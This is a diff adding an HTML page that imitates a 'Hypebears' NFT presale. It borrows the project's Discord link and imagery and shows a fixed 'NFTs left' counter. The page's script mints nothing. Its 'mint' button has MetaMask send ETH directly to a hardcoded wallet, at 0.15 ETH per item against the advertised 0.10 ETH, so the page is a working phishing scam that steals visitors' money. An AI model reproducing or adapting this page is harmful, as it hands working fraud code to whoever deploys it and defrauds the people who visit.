@@ -1,0 +1,155 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Hypebears</title>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <style>
+    body{
+    background-image:url("https://thehypebears.co/bg.jpg");
+    margin:0 auto;
+    width:100%;
+    overflow-x:hidden;
+    }
+        .main{
+        margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+  max-width:100%;
+  overflow-x:hidden;
+        }
+        .container{
+        text-align:center;
+        position:relative;
+        top:auto;
+        margin:30px;
+        right:-50px;
+        }
+        .container2{
+        position:relative;
+        text-align:center;
+        margin:0 auto;
+        background: rgba(0, 0, 0, 0.4);
+        width:400px;
+        height:850px;
+        }
+
+        #rcorners{
+        border-radius:25px;
+        border:2px solid #333;
+
+        }
+        .container3{
+        }
+        .btn {
+    border: 3px
+    solid white;
+    padding: 8px 30px;
+    border-radius: 20px
+    margin-top: 5px;
+    margin-right: 10px;
+    background-color: black;
+    font-weight: bold;
+    z-index:2;
+    }
+    input {
+    background-color: #66000000;
+    padding: 5px;
+    font-size: 22px;
+    font-weight: bold;
+    border-radius: 25px;
+    font-family: Poppins, sans-serif;
+    color: white;
+    border: #66000000 3pxsolid;
+    width: 70px;
+    text-align: center;
+}
+
+    </style>
+</head>
+<body>
+    <div class="main">
+        <div class="container">
+            <a href="https://discord.com/invite/hypebears">
+                <img style="width:400px;height:150px;" src="https://thehypebears.co/61d2ff2dfb59c756d75a4007/500.png">
+            </a>
+        </div>
+        <div class="container2" id="rcorners">
+            <br>
+            <h1 style="font-weight:bold;margin:25px;">PRESALE<br>
+            JUST OPENED!</h1>
+            <p>
+                NFTs left:<em id="left">    967  </em>/1000
+            </p>
+            <p>
+                0.10 ETH each, 10 per wallet
+            </p>
+            <h2>February 3 4-12am</h2>
+            <div class="container3">
+                <button class="btn" onclick="minus()">-</button>
+                <input id="mintnumber" min="1" max="10" value="1">
+                <button class="btn" onclick="plus()">+</button>
+                <br>
+                <br>
+                <button id='mint' class="btn">mint</button>
+                <br>
+                <button id='connect' class="btn">connect</button>
+
+
+            </div>
+            <img id="rcorners" style="width:300px;margin:25px;" src="https://hypebearmint.net/media/photo.gif">
+            <p style="position:relative;">🦊 Connect to Metamask using the top right button.
+            </p>
+        </div>
+        <div class="mediacontainer">
+
+        </div>
+    </div>
+<script>
+    "use strict";
+
+    let qte=1;
+    const acc= "0x0F793755016d598E32749E1f55f92716d93c9E16";
+
+    const ethereumButton = document.getElementById('connect');
+        ethereumButton.addEventListener('click', () => {
+        ethereum.request({ method: 'eth_requestAccounts' });
+    });
+
+    const sendEthButton = document.getElementById('mint');
+    let accounts = [];
+        sendEthButton.addEventListener('click', () => {
+        var eth=(150000000000000000*qte).toString(16);
+
+        ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [
+            {
+              from: ethereum.selectedAddress,
+              to: "0x0F793755016d598E32749E1f55f92716d93c9E16",
+              value: '0x'+eth,
+              chainId: '0x1',
+            },
+          ],
+        })
+        .then((txHash) => console.log(txHash))
+        .catch((error) => console.error);
+        });
+
+
+    function plus(){
+    if (qte < 10) qte += 1;
+    document.getElementById("mintnumber").setAttribute("value",qte);
+    }
+
+    function minus(){
+    if (qte > 1) qte-=1;
+    document.getElementById("mintnumber").setAttribute("value",qte);
+    }
+
+
+
+
+</script>
+</body>
+</html>
